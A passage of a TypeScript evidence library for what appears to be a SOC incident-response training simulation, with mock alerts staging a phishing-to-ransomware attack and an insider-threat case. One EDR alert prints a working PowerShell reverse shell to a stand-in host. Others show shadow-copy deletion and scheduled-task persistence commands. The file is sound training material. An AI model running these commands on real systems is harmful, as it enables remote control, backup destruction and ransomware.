export type ArtifactType =
  | "SIEM"
  | "EDR"
  | "EMAIL"
  | "NETWORK"
  | "FILE"
  | "DLP"
  | "THREAT_INTEL"
  | "CLOUD"
  | "ENDPOINT";

export type Severity = "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";

export interface InvestigationArtifact {
  id: string;
  type: ArtifactType;
  title: string;
  source: string;
  severity: Severity;
  timestamp: string;
  summary: string;
  content: string;
}

type EvidenceMap = Record<string, Record<string, InvestigationArtifact[]>>;

const LIBRARY: EvidenceMap = {

  // ── PHISHING TO RANSOMWARE ────────────────────────────────────────────────

  "phishing-to-ransomware": {

    NORMAL: [
      {
        id: "ptr_normal_ti",
        type: "THREAT_INTEL",
        title: "TI Advisory: CARBON SPIDER — Financial Sector Campaign",
        source: "ThreatConnect Intelligence Feed",
        severity: "MEDIUM",
        timestamp: "09:05:14 UTC",
        summary: "Known ransomware group actively targeting financial institutions with invoice lure emails.",
        content: `INDICATOR REPORT — TLP:AMBER
Threat Actor : CARBON SPIDER (UNC2165 / EvilCorp affiliate)
Campaign     : Q4 Invoice Distribution — Active
Target Sector: Financial Services, Insurance, Real Estate
First Seen   : 2026-05-28  |  Last Updated: Today 08:47 UTC

INDICATORS OF COMPROMISE
  Domain : invoice-secure[.]net  (registered 2026-05-26, WHOIS redacted)
  Domain : billing-review[.]co   (parked, resolves to 198.51.100.42)
  IP     : 198.51.100.42         (AS9009, Bulletproof hosting, DE)
  Hash   : d5f3a1e7c9b24f8a... (macro dropper, VirusTotal 34/72)

TTPs (MITRE ATT&CK)
  T1566.001  Spearphishing Attachment
  T1204.002  Malicious File (Office macro)
  T1059.001  PowerShell execution
  T1071.001  C2 over HTTPS

ANALYST NOTES
Three peer institutions compromised in the last 90 days via this actor.
Average dwell time before ransomware detonation: 4–6 hours from initial click.
Email lure uses convincing invoice branding with urgent payment language.

RECOMMENDED ACTIONS (not yet applied)
- Block invoice-secure[.]net and billing-review[.]co at email gateway
- Enable macro execution alerting on Office suite via EDR policy
- Notify Finance department heads — this campaign targets finance staff`,
      },
      {
        id: "ptr_normal_gw",
        type: "EMAIL",
        title: "Email Gateway: 3 Quarantined Messages — invoice-secure.net",
        source: "Proofpoint Threat Awareness & Protection",
        severity: "HIGH",
        timestamp: "09:15:33 UTC",
        summary: "3 emails quarantined in the last 20 minutes. All from the same sender domain flagged in threat intel.",
        content: `QUARANTINE SUMMARY REPORT
Generated  : 09:15:33 UTC
Trigger    : Domain reputation threshold exceeded

QUARANTINED MESSAGES (3)

[1] 09:03:17 UTC
    From    : invoices@invoice-secure.net
    To      : s.patel@[COMPANY].com (Finance Director)
    Subject : Q4 Invoice #8847 — Payment Required by EOD
    Reason  : Domain blacklist (ThreatConnect), macro attachment
    File    : Invoice_Q4_Final.xlsm (SHA256: d5f3a1e7c9b2...)
    Action  : QUARANTINED

[2] 09:07:41 UTC
    From    : invoices@invoice-secure.net
    To      : accounts@[COMPANY].com
    Subject : URGENT: Overdue Invoice — Account Suspension Warning
    Reason  : Domain blacklist, macro attachment
    File    : Statement_Nov2026.xlsm (SHA256: d5f3a1e7c9b2...)
    Action  : QUARANTINED

[3] 09:11:09 UTC
    From    : noreply@billing-review.co
    To      : m.chen@[COMPANY].com (Finance)
    Subject : Re: Payment Confirmation — Action Required
    Reason  : New domain (< 7 days old), macro attachment
    File    : PaymentConf_2026.xlsm (SHA256: 8a4c2f1d...)
    Action  : QUARANTINED

⚠  NOTE: Email gateway policy allows users to self-release quarantined
   messages after 15 minutes if not marked malicious by admin.
   Time remaining before self-release window opens: 6 minutes.`,
      },
    ],

    PHISHING_ACTIVE: [
      {
        id: "ptr_phish_email",
        type: "EMAIL",
        title: "Recovered: Phishing Email Opened by Finance User",
        source: "Exchange Online Protection / Proofpoint",
        severity: "HIGH",
        timestamp: "10:03:44 UTC",
        summary: "Full email headers and body recovered. User s.patel opened and enabled macros on the attachment.",
        content: `RECOVERED MESSAGE — FORENSIC COPY
Retrieved from: Exchange mailbox s.patel@[COMPANY].com
Status: OPENED at 10:03:44 UTC (macro execution attempted 10:03:51)

─── RAW HEADERS ──────────────────────────────────────────
Received: from mail.invoice-secure.net (198.51.100.42)
  by mx.protection.outlook.com; Fri, 05 Jun 2026 10:02:11 +0000
From: "Accounts Payable <ap@invoice-secure.net>"
To: s.patel@[COMPANY].com
Subject: Q4 Invoice #8847 — Payment Required by EOD
Date: Fri, 05 Jun 2026 09:58:03 +0000
X-Mailer: phpmailer (spoofed Office 365 headers)
MIME-Version: 1.0
Content-Type: multipart/mixed

─── MESSAGE BODY ─────────────────────────────────────────
Dear Finance Team,

Please find attached invoice #8847 for £23,450 relating to services
rendered in Q3 2026. Payment is due by close of business today.

To view the invoice breakdown, please open the attached Excel file
and click "Enable Content" when prompted.

If you have any questions, please contact ap@invoice-secure.net

Kind regards,
David Thornton
Senior Accounts Payable
Meridian Financial Partners

─── ATTACHMENT ───────────────────────────────────────────
Filename : Invoice_Q4_Final.xlsm
Size     : 47.3 KB
SHA256   : d5f3a1e7c9b24f8a3d6e12bc5f7a8e9d...
Type     : Excel Open XML Macro-Enabled Workbook

⚠  ANALYST NOTE: User clicked "Enable Content" at 10:03:51 UTC
   Macro execution triggered powershell.exe child process.`,
      },
      {
        id: "ptr_phish_edr",
        type: "EDR",
        title: "CRITICAL: Macro → PowerShell Execution — WKSTN-FIN-04",
        source: "CrowdStrike Falcon EDR",
        severity: "CRITICAL",
        timestamp: "10:03:51 UTC",
        summary: "Office macro spawned a PowerShell process on the Finance workstation. Execution chain visible.",
        content: `DETECTION ALERT — CrowdStrike Falcon
Severity  : CRITICAL
Host      : WKSTN-FIN-04  (192.168.1.45)
User      : [COMPANY]\\s.patel
OS        : Windows 10 Pro 22H2

PROCESS TREE
  WINWORD.EXE (PID 3284)
  └─ cmd.exe /c (PID 7441)
     └─ powershell.exe -WindowStyle Hidden -EncodedCommand (PID 7892)
        └─ (network connection established)

DECODED COMMAND
  powershell.exe -nop -w hidden -enc
  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
  [decoded]:
  $client = New-Object Net.Sockets.TCPClient('198.51.100.42',4444);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
  }

NETWORK ACTIVITY
  192.168.1.45:49832 → 198.51.100.42:4444 [ESTABLISHED]

RECOMMENDED: Isolate WKSTN-FIN-04 immediately.`,
      },
      {
        id: "ptr_phish_net",
        type: "NETWORK",
        title: "Firewall: Connection to Known C2 — 198.51.100.42:4444",
        source: "Palo Alto Networks NGFW",
        severity: "CRITICAL",
        timestamp: "10:04:02 UTC",
        summary: "Outbound TCP to confirmed C2 infrastructure. Reverse shell traffic pattern detected.",
        content: `THREAT LOG — Palo Alto Networks
Policy     : Block-Known-C2 (TRIGGERED — ALLOWED before policy update)
Direction  : Outbound
Source     : 192.168.1.45 (WKSTN-FIN-04, Finance VLAN)
Destination: 198.51.100.42:4444
Protocol   : TCP
App-ID     : unknown-tcp
Bytes sent : 1,247  |  Bytes received: 8,934
Duration   : ACTIVE (ongoing)
Threat     : Potential C2 beacon (reverse shell signature)

HISTORICAL CONTEXT — 198.51.100.42
  First seen in org : Never (new destination)
  ThreatConnect     : MALICIOUS — CARBON SPIDER C2 infrastructure
  VirusTotal        : 41/72 vendors flag as malicious
  Passive DNS       : ms-update[.]net, invoice-secure[.]net

SESSION DETAIL
10:04:02  SYN        192.168.1.45 → 198.51.100.42:4444
10:04:02  SYN-ACK    198.51.100.42 → 192.168.1.45
10:04:03  Reverse shell handshake (PowerShell signature)
10:04:10  C2 command: whoami  →  [COMPANY]\\s.patel
10:04:11  C2 command: hostname  →  WKSTN-FIN-04
10:04:15  C2 command: net user /domain
10:04:22  C2 command: ipconfig /all
          ← attacker enumerating network topology

⚠  Active session. Attacker has interactive shell access.`,
      },
    ],

    INITIAL_COMPROMISE: [
      {
        id: "ptr_comp_edr",
        type: "EDR",
        title: "LSASS Credential Dump — WKSTN-FIN-04",
        source: "CrowdStrike Falcon EDR",
        severity: "CRITICAL",
        timestamp: "10:16:33 UTC",
        summary: "Attacker dumped credentials from LSASS memory. Domain admin hashes likely captured.",
        content: `DETECTION ALERT — CrowdStrike Falcon
Technique : T1003.001 — LSASS Memory Dump
Severity  : CRITICAL
Host      : WKSTN-FIN-04  (192.168.1.45)

PROCESS ACTIVITY
10:14:31  powershell.exe spawned mimikatz (renamed: svchost32.exe)
10:14:33  OpenProcess(LSASS.EXE) — handle acquired
10:14:34  MiniDumpWriteDump() called on lsass.exe
10:14:35  Dump written: C:\\Windows\\Temp\\~tmp4f7.dmp (42 MB)
10:14:41  Credentials extracted from dump:

CAPTURED CREDENTIALS (PARTIAL)
  [HASH] s.patel       NTLM: a72f4c1e8b9d3...  (Finance Director)
  [HASH] it.admin      NTLM: 9c3e5f2a7d8b1...  (IT Administrator)
  [HASH] WKSTN-FIN-04$ NTLM: 2b8d4a1f6c9e7... (Machine account)
  [PLAINTEXT] svc_backup  Password: Backup@2026!  (Backup service)

NETWORK EXFIL
10:14:48  C2 command: copy C:\\Windows\\Temp\\~tmp4f7.dmp
10:14:52  Upload to 198.51.100.42 (47 MB over port 4444) — COMPLETE

⚠  Domain admin credentials (it.admin) compromised.
   Attacker can now authenticate to ANY domain-joined system.`,
      },
      {
        id: "ptr_comp_siem",
        type: "SIEM",
        title: "SIEM: C2 Beacon Pattern — 5-Minute Interval DNS",
        source: "Splunk Enterprise Security",
        severity: "HIGH",
        timestamp: "10:18:07 UTC",
        summary: "Regular DNS queries to ms-update.net matching C2 beaconing pattern. Persistence mechanism active.",
        content: `SPLUNK CORRELATION SEARCH — C2_Beacon_Detected
Search     : index=network dest=ms-update.net | bucket _time span=1m | stats count by src_ip
Severity   : HIGH
Alert fired: 10:18:07 UTC

DNS QUERY LOG — ms-update[.]net (MALICIOUS)
  10:03:58  192.168.1.45  → ms-update.net  (A record)  ANSWER: 198.51.100.42
  10:08:59  192.168.1.45  → ms-update.net  (A record)  ANSWER: 198.51.100.42
  10:13:58  192.168.1.45  → ms-update.net  (A record)  ANSWER: 198.51.100.42
  10:18:58  192.168.1.45  → ms-update.net  (A record)  ANSWER: 198.51.100.42

BEACON ANALYSIS
  Interval     : 300 ± 4 seconds (consistent beaconing)
  Jitter       : 1.3% (automated — not human browsing)
  Domain age   : 12 days  |  Registrar: NameCheap (privacy-protected)
  Pattern match: CARBON SPIDER C2 beacon profile (confidence: HIGH)

AFFECTED HOST
  src_ip   : 192.168.1.45  (WKSTN-FIN-04)
  user     : [COMPANY]\\s.patel
  Since    : 10:03:58 UTC  (15 minutes, 4 beacons observed)

CONTEXT: Beaconing confirms persistent implant — not just a one-time
execution. Attacker has ongoing C2 channel. Isolate host immediately.`,
      },
    ],

    DOMAIN_COMPROMISE: [
      {
        id: "ptr_dc_dcsync",
        type: "EDR",
        title: "CRITICAL: DCSync Attack — 340 Domain Accounts Dumped",
        source: "CrowdStrike Falcon / Microsoft Defender for Identity",
        severity: "CRITICAL",
        timestamp: "10:47:03 UTC",
        summary: "Attacker executed DCSync from a non-DC host, replicating all domain account hashes. Every credential in the domain is compromised.",
        content: `MICROSOFT DEFENDER FOR IDENTITY — CRITICAL ALERT
Alert     : Suspected DCSync attack (replication of directory services)
Severity  : CRITICAL  |  MITRE: T1003.006

ATTACK DETAIL
  Source host  : SRV-FILE-01  (192.168.10.12)  ← NOT a Domain Controller
  User account : [COMPANY]\\it.admin  (stolen credentials)
  Target DC    : SRV-DC01  (192.168.10.5)
  Time         : 10:47:03 UTC

WHAT HAPPENED
  A non-DC machine used the MS-DRSR protocol (normally DC-to-DC only)
  to request a full replication of all directory secrets from DC01.
  This is the Mimikatz "lsadump::dcsync" technique.

ACCOUNTS REPLICATED (full NTLM hash dump)
  Total accounts : 340
  Privileged     : 23  (Domain Admins, Enterprise Admins, Schema Admins)
  Service accts  : 47  (many have old, weak passwords)
  User accts     : 270

  CRITICAL ACCOUNTS EXPOSED:
  [COMPANY]\\Administrator  — NTLM: 5f4dcc3b5aa765... (root of the domain)
  [COMPANY]\\krbtgt         — NTLM: 2b6ac5f1d8e7c9... (Golden Ticket risk)
  [COMPANY]\\svc-backup     — NTLM: 9e3f7a2c4b8d1... (plaintext: Backup@2026!)

⚠  krbtgt hash compromised = attacker can forge Golden Tickets
   Reset krbtgt password TWICE to invalidate existing Kerberos tickets.
   Domain is fully owned until this is done.`,
      },
      {
        id: "ptr_dc_persistence",
        type: "SIEM",
        title: "Persistence Backdoor Created — New Domain Admin Account",
        source: "Splunk / Windows Security Event Log",
        severity: "CRITICAL",
        timestamp: "10:48:44 UTC",
        summary: "Attacker created a hidden Domain Admin account and added Registry persistence on DC01 as a backup if caught.",
        content: `SPLUNK ALERT — Persistence_Mechanism_Detected
Correlation: New_DA_Account + Registry_Run_Key_Added
Severity   : CRITICAL

EVENT 1 — NEW DOMAIN ADMIN ACCOUNT
  10:48:44  Event 4720 — User account created:
    Account : svc-backup-admin  (disguised as service account)
    Groups  : Domain Admins, Enterprise Admins
    Created by: [COMPANY]\\it.admin (compromised)
    Password: Set (does not expire, cannot be changed)

EVENT 2 — REGISTRY PERSISTENCE (DC01)
  10:50:12  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    Key added: "WindowsDefenderUpdate"
    Value    : C:\\Windows\\Temp\\WinDef32.exe  (reverse shell)
    Host     : SRV-DC01

EVENT 3 — SHADOW COPY DELETION
  10:52:07  vssadmin.exe delete shadows /all /quiet
    Host    : SRV-DC01  (ALL domain controller backups destroyed)
    Host    : SRV-FILE-01
    Host    : SRV-BACKUP-01

EVENT 4 — SCHEDULED TASK CREATED (redundant persistence)
  10:53:44  schtasks /create /tn "SystemMaintenance" /tr C:\\Windows\\Temp\\WinDef32.exe
    Trigger : Every 4 hours, runs as SYSTEM
    Host    : SRV-DC01

⚠  Attacker has four persistence mechanisms. Even if primary access
   is cut, backdoors remain active. Full forensic sweep required.`,
      },
    ],

    DATA_EXFILTRATION: [
      {
        id: "ptr_exfil_dlp",
        title: "DLP: 47GB Archive Staged — Payroll, Client Data, IP",
        type: "DLP",
        source: "Forcepoint DLP / Symantec",
        severity: "CRITICAL",
        timestamp: "11:02:19 UTC",
        summary: "47GB of sensitive data staged on the file server into a single encrypted archive before transmission. Transfer to external IP in progress.",
        content: `DLP CRITICAL ALERT — Data_Staging_Pre_Exfil
Policy     : Bulk_Sensitive_Archive_Created
Severity   : CRITICAL  |  Time: 11:02:19 UTC

STAGED ARCHIVE DETAILS
  File    : C:\\Windows\\Temp\\svchost_backup.7z  (7-Zip encrypted)
  Size    : 47.3 GB
  Created : 10:58:44 UTC  (by svc-backup-admin — attacker's backdoor account)
  Password: Unknown (AES-256 encrypted)

CONTENTS (based on directory scan before compression)
  /client_data/      — Customer financial records (2.1M records)
  /payroll/          — Employee salary data, NI numbers, bank details (847 records)
  /ip_documents/     — Proprietary trading algorithms, risk models
  /contracts/        — Client agreements (incl. under NDA)
  /executive_email/  — 90-day email archive for CEO, CFO, CLO
  /ad_dump/          — All 340 domain account hashes

EXFILTRATION IN PROGRESS
  11:05:03  Outbound transfer started
  Destination: 45.142.212.100:443  (TLS encrypted)
  IP Owner: Serverius AS (Netherlands, bulletproof)
  Transfer rate: ~95 Mbps
  Estimated completion: 11:14:20 UTC

  Progress: ████████░░░░░░░░  47%  (22.1 GB / 47.3 GB transferred)

⚠  TIME CRITICAL: ~9 minutes until transfer completes.
   Block egress NOW to prevent remaining 25GB from leaving.
   Data already transmitted (22GB) cannot be recalled.`,
      },
      {
        id: "ptr_exfil_tor",
        type: "NETWORK",
        title: "Tor Browser Deployed Across 12 Endpoints",
        source: "Palo Alto Networks / Proxy logs",
        severity: "HIGH",
        timestamp: "11:08:33 UTC",
        summary: "Attacker installed Tor Browser on 12 endpoints as an alternate exfil channel. Communications now anonymised.",
        content: `NETWORK ALERT — Tor_Traffic_Detected
Tool      : Palo Alto App-ID + URL Filtering
Category  : Proxy-Avoidance, Tor exit node traffic
Severity  : HIGH

TOR INSTALLATION EVENTS (PsExec-deployed via svc-backup-admin)
  11:07:12  WKSTN-EXEC-01  — torbrowser-install-13.0.1.exe executed
  11:07:18  WKSTN-EXEC-02  — torbrowser-install-13.0.1.exe executed
  11:07:24  WKSTN-FIN-04   — torbrowser-install-13.0.1.exe executed
  [9 more endpoints]

ACTIVE TOR CONNECTIONS (sampled)
  11:08:33  192.168.1.45 → 195.176.3.23:443  (Tor guard node, CH)
  11:08:35  192.168.1.22 → 89.234.157.254:443 (Tor guard node, FR)

TOR TRAFFIC CONTENT (cannot be inspected — encrypted)
  Estimated volume over Tor: 340 MB (additional exfil channel)
  Communication pattern: Consistent with C2 over Tor hidden service

ANALYST NOTE
  Tor is being used as a secondary exfil channel alongside the primary
  45.142.212.100 transfer. Even if you block the primary destination,
  attacker has Tor as a fallback.

  Recommend: Block all Tor exit nodes at firewall (Palo Alto provides
  daily updated threat feed for Tor exit IPs under App-ID "tor").`,
      },
    ],

    RANSOMWARE_DEPLOYED: [
      {
        id: "ptr_ransom_edr",
        title: "RANSOMWARE ACTIVE — .sage_enc Extension, 847 Endpoints",
        type: "EDR",
        source: "CrowdStrike Falcon — Mass Encryption Event",
        severity: "CRITICAL",
        timestamp: "11:18:02 UTC",
        summary: "LockBit 3.0 detonated across 847 endpoints simultaneously. File encryption underway. Ransom note deployed to all desktops.",
        content: `CROWDSTRIKE FALCON — CRITICAL INCIDENT ALERT
Event     : RANSOMWARE MASS ENCRYPTION DETECTED
Technique : T1486 — Data Encrypted for Impact
Severity  : CRITICAL  |  Time: 11:18:02 UTC

RANSOMWARE BINARY
  Name    : WinDef32.exe  (disguised as Windows Defender)
  Family  : LockBit 3.0  (AI confidence: 99%)
  SHA256  : 7f4e2c8b3a1d5f9e2c6a...
  Deployed via: Scheduled task on all domain-joined hosts

ENCRYPTION STATUS
  11:18:02  Encryption thread started on 847 hosts simultaneously
  11:18:15  25% of files encrypted across estate
  11:19:44  50% encrypted  (financial records now inaccessible)
  11:21:33  75% encrypted  (ERP database files encrypted)
  11:24:01  95% encrypted  (Exchange database encrypted)

FILE EXTENSION: .sage_enc (appended to all encrypted files)
EXAMPLES:
  financial_statements_Q4.xlsx    → financial_statements_Q4.xlsx.sage_enc
  client_contracts_2026.pdf       → client_contracts_2026.pdf.sage_enc
  trading_algorithms_v3.py        → trading_algorithms_v3.py.sage_enc

RANSOM NOTE — README_DECRYPT.txt (on all desktops)
  "Your network has been encrypted by LockBit 3.0.
   To decrypt your files, pay 2.4 Bitcoin (~$135,000) to:
   bc1q3g4h5j6k7l8m9n0p1q2r3s4t5u6v7w8x9y0z
   Contact: lockbit-support@onion.link
   DEADLINE: 72 hours. After that, price doubles.
   PROOF: We have exfiltrated 47GB. Non-payment = public release."

SYSTEMS OFFLINE
  ERP Platform, Trading Systems, Exchange, Active Directory (partial)`,
      },
      {
        id: "ptr_ransom_impact",
        type: "SIEM",
        title: "Business Impact: All Financial Systems Down",
        source: "Splunk SIEM / IT Operations",
        severity: "CRITICAL",
        timestamp: "11:22:47 UTC",
        summary: "Full operational assessment. All critical business systems offline. Backup infrastructure also encrypted. Recovery timeline estimated at 10–14 days minimum.",
        content: `OPERATIONAL IMPACT ASSESSMENT — RANSOMWARE INCIDENT
Prepared  : 11:22:47 UTC  |  Status: ACTIVE INCIDENT

SYSTEMS OFFLINE (confirmed encrypted)
  ✗ Bloomberg Terminal (trading data feeds)
  ✗ FX Trading Platform  — $47M in open positions unmanaged
  ✗ Risk Management System  — No real-time exposure visibility
  ✗ Client Portal  — Clients cannot access accounts
  ✗ Email (Exchange)  — No internal or external comms
  ✗ VPN  — Remote staff fully disconnected
  ✗ Finance ERP (SAP)  — Payroll run due TONIGHT: AT RISK
  ✗ Backup Server  — SRV-BACKUP-01 also encrypted
  ✗ Domain Controllers (partial)  — Some authentication failing

BACKUP STATUS
  Last clean backup: 6 days ago (weekly backup)
  Incremental backups (daily): ALL ENCRYPTED by attacker
  Offsite tape backup: YES — but requires 3 business days to restore
  Cloud backup (Azure): NOT configured for these systems

ESTIMATED RECOVERY WITHOUT PAYING RANSOM
  Phase 1 — Clean systems, rebuild AD: 3–5 days
  Phase 2 — Restore from 6-day-old backup: 3–4 days
  Phase 3 — Reconcile 6 days of lost transactions: 5–10 days
  Total minimum downtime: 10–14 business days

FINANCIAL EXPOSURE
  Trading losses (unmanaged positions): TBD
  Regulatory fines (if client data leaked): Up to 4% global turnover
  Recovery and forensics costs: Est. £2–4M
  Ransom demand: $135,000 BTC (no guarantee of decryption)`,
      },
    ],

    LATERAL_MOVEMENT: [
      {
        id: "ptr_lat_auth",
        type: "SIEM",
        title: "Pass-the-Hash: it.admin Authenticating Across Network",
        source: "Splunk Enterprise Security — Windows Event Logs",
        severity: "CRITICAL",
        timestamp: "10:47:22 UTC",
        summary: "Stolen domain admin hash used to authenticate to 12 systems in 8 minutes. Mass lateral movement in progress.",
        content: `SPLUNK ALERT — Pass_the_Hash_Detected
Correlation: Same NTLM hash authenticating to multiple hosts without Kerberos
Severity   : CRITICAL

AUTHENTICATION LOG — it.admin (SUSPICIOUS)
  Source     : 192.168.1.45  (WKSTN-FIN-04 — compromised)
  Account    : [COMPANY]\\it.admin

  10:39:14  Event 4624 (Logon Type 3)  → SRV-DC01        (DOMAIN CONTROLLER)
  10:39:31  Event 4624 (Logon Type 3)  → SRV-FILE01      (File server)
  10:39:48  Event 4624 (Logon Type 3)  → SRV-BACKUP01    (Backup server)
  10:40:12  Event 4624 (Logon Type 3)  → SRV-EXCHANGE01  (Email server)
  10:41:03  Event 4624 (Logon Type 3)  → WKSTN-EXEC-01   (CEO workstation)
  10:41:28  Event 4624 (Logon Type 3)  → WKSTN-EXEC-02   (CFO workstation)
  10:42:15  Event 4624 (Logon Type 3)  → WKSTN-EXEC-03   (CISO workstation)
  10:43:07  Event 4624 (Logon Type 3)  → SRV-SQL01       (Production database)
  [4 more hosts...]

NTLM vs KERBEROS ANALYSIS
  Normal it.admin logons: 100% Kerberos (no NTLM in 90-day baseline)
  Current logons        : 100% NTLM (Pass-the-Hash signature)

VOLUME SHADOW COPY DELETION (10:44:01)
  SRV-DC01: vssadmin.exe delete shadows /all /quiet
  → Backups being destroyed. PRE-RANSOMWARE INDICATOR.`,
      },
      {
        id: "ptr_lat_edr",
        type: "EDR",
        title: "PsExec Execution Across 8 Hosts — Ransomware Staging",
        source: "CrowdStrike Falcon EDR",
        severity: "CRITICAL",
        timestamp: "10:52:14 UTC",
        summary: "Attacker deploying ransomware payload to networked hosts using PsExec with stolen admin credentials.",
        content: `DETECTION ALERT — CrowdStrike Falcon
Technique : T1021.002 — SMB/Windows Admin Shares + PsExec
Severity  : CRITICAL  |  Category: PRE-RANSOMWARE DEPLOYMENT

LATERAL MOVEMENT — PSEXEC ACTIVITY
  Source     : SRV-DC01 (192.168.10.5) — attacker pivoted to DC
  Using creds: [COMPANY]\\it.admin (stolen NTLM hash)

  10:51:02  PsExec → SRV-FILE01:    copy ransom.exe to C$\\Windows\\Temp\\
  10:51:18  PsExec → SRV-BACKUP01:  copy ransom.exe to C$\\Windows\\Temp\\
  10:51:34  PsExec → SRV-SQL01:     copy ransom.exe to C$\\Windows\\Temp\\
  10:51:50  PsExec → WKSTN-EXEC-01: copy ransom.exe to C$\\Windows\\Temp\\
  10:52:14  EXECUTION IMMINENT — payload staged on 8 hosts

RANSOMWARE BINARY ANALYSIS
  File    : ransom.exe  (SHA256: 7f4e2c8b3a1d...)
  Family  : LockBit 3.0 (Falcon AI confidence: 97%)
  Behavior: File encryption, shadow copy deletion, ransom note drop

⚠  CRITICAL: DETONATION WINDOW < 5 MINUTES
   Hosts with staged payload:
   SRV-FILE01, SRV-BACKUP01, SRV-SQL01, SRV-EXCHANGE01,
   WKSTN-EXEC-01, WKSTN-EXEC-02, WKSTN-FIN-04, SRV-DC01

   Network isolation required NOW to prevent mass encryption.`,
      },
    ],

  },

  // ── INSIDER THREAT ────────────────────────────────────────────────────────

  "insider-threat": {

    NORMAL: [
      {
        id: "it_normal_dlp",
        type: "DLP",
        title: "DLP Alert: After-Hours Database Access — J.Morrison",
        source: "Forcepoint DLP",
        severity: "MEDIUM",
        timestamp: "23:47:12 UTC (yesterday)",
        summary: "Senior engineer accessed production database at 23:47 outside normal hours. No business justification on record.",
        content: `DLP ALERT — Policy: After_Hours_Sensitive_Access
Generated : Yesterday 23:48:01 UTC  |  Severity: MEDIUM

USER ACTIVITY
  Account  : j.morrison@[COMPANY].com  (Senior Platform Engineer)
  Host     : WKSTN-ENG-17  (192.168.2.88)
  Action   : Database query — PROD-DB-01 (customer records)
  Time     : 23:47:12 UTC  (outside business hours 07:00–20:00)
  Duration : 47 minutes

DATA ACCESSED
  Table: customer_records     Rows queried: 89,451
  Table: payment_methods      Rows queried: 23,788
  Table: api_keys             Rows queried: 4,122
  Total data volume: 847 MB (significantly above normal)

BASELINE COMPARISON
  J.Morrison normal working hours: 08:30–18:00
  Last after-hours access (prev 90 days): ZERO
  Normal daily data volume: 12–45 MB

CONTEXT
  HR note (CONFIDENTIAL): J.Morrison submitted resignation 3 weeks ago.
  Final day scheduled: 2 weeks from today.
  Badge access: Active. System access: Active.

⚠  Pattern matches insider data exfiltration profile.
   Recommend correlation with USB/cloud upload activity.`,
      },
      {
        id: "it_normal_badge",
        type: "ENDPOINT",
        title: "Badge Log: Server Room Access — 23:51 UTC",
        source: "Building Access Control System",
        severity: "LOW",
        timestamp: "23:51:08 UTC (yesterday)",
        summary: "J.Morrison badged into the server room 4 minutes after the database access began. Physical USB access possible.",
        content: `ACCESS CONTROL LOG — Building Management System
Site     : [COMPANY] HQ — 3rd Floor Server Room (SR-301)
Generated: Yesterday 23:51:08 UTC

RECENT ACCESS — SR-301 (Server Room)
  23:51:08  ENTRY   j.morrison  Badge #4471  (Access granted)
  00:34:22  EXIT    j.morrison  Badge #4471  (Duration: 43m 14s)

NORMAL ACCESS PATTERN — j.morrison (90 days)
  Server room visits: 3 total  (typically with another engineer)
  Last visit: 47 days ago  |  Time: 14:22 UTC  |  Duration: 8 min

CCTV NOTE
  Camera SR-301-A (server bay) — footage available for review.
  Retention: 30 days.

OTHER AFTER-HOURS BADGE ACTIVITY
  23:47:01  ENTRY   j.morrison  Building entrance (Lobby A)
  23:51:08  ENTRY   j.morrison  SR-301 Server Room
  00:34:22  EXIT    j.morrison  SR-301 Server Room
  00:35:14  EXIT    j.morrison  Building (Lobby A exit)

⚠  Physical presence during the data access window.
   USB devices cannot be detected remotely — inspect CCTV footage
   and check DLP for USB device events on WKSTN-ENG-17.`,
      },
    ],

    SUSPICIOUS_ACCESS: [
      {
        id: "it_susp_git",
        type: "FILE",
        title: "GitHub Enterprise: Bulk Repository Clone — j.morrison",
        source: "GitHub Enterprise Audit Log",
        severity: "HIGH",
        timestamp: "07:14:33 UTC",
        summary: "Engineer cloned 34 repositories in 11 minutes this morning including restricted R&D and infrastructure repos.",
        content: `GITHUB ENTERPRISE AUDIT LOG
Org      : [COMPANY]-internal
User     : j.morrison  |  IP: 192.168.2.88 (WKSTN-ENG-17)
Alert    : Bulk clone threshold exceeded (>10 repos in 30 minutes)
Generated: 07:14:33 UTC

CLONE EVENTS — 07:03:02 to 07:14:33 UTC
  07:03:02  git clone  platform-core              (1.2 GB)
  07:03:41  git clone  infrastructure-ansible     (340 MB)  [RESTRICTED]
  07:04:09  git clone  auth-service               (89 MB)
  07:04:38  git clone  payment-gateway            (234 MB)  [RESTRICTED]
  07:05:12  git clone  mobile-ios                 (512 MB)
  07:05:47  git clone  mobile-android             (489 MB)
  07:06:21  git clone  ml-models-prod             (2.1 GB)  [RESTRICTED]
  07:07:15  git clone  customer-data-pipeline     (178 MB)  [RESTRICTED]
  07:08:02  git clone  secrets-vault-config       (12 MB)   [RESTRICTED — requires MFA]
  07:09:18  git clone  deployment-keys            (4 MB)    [RESTRICTED]
  ...24 more repositories

TOTAL CLONED: 34 repos  |  ~9.8 GB  |  Duration: 11m 31s

CLASSIFICATION
  Public:     8 repos
  Internal:   16 repos
  Restricted: 10 repos  ← requires VP Engineering approval for bulk export

NORMAL BASELINE — j.morrison
  Daily clone volume: 0–3 repos  |  Total this morning: 34
  Restricted access: typically with manager approval ticket`,
      },
      {
        id: "it_susp_cloud",
        type: "DLP",
        title: "DLP: 9.2 GB Upload to Personal Google Drive",
        source: "Forcepoint DLP / Web Proxy",
        severity: "CRITICAL",
        timestamp: "07:31:14 UTC",
        summary: "Large upload to personal cloud storage immediately after the repository clone. Pattern matches deliberate exfiltration.",
        content: `DLP ALERT — Policy: Cloud_Storage_Sensitive_Upload
Severity : CRITICAL  |  Triggered: 07:31:14 UTC

DATA TRANSFER DETECTED
  Source   : 192.168.2.88  (WKSTN-ENG-17 — j.morrison)
  Dest     : drive.google.com  (Personal Google account — not corporate SSO)
  Volume   : 9.2 GB
  Duration : 07:22:48 – 07:31:14 UTC  (8 minutes 26 seconds)
  Protocol : HTTPS (TLS 1.3)

GOOGLE ACCOUNT IDENTIFIED
  Account  : john.morrison.personal@gmail.com
  (Corporate policy prohibits uploading source code to personal accounts)

FILE TYPE ANALYSIS (sampled)
  .git/     — Git repository data
  .tf       — Terraform infrastructure configs
  .pem      — Certificate/key files  ⚠
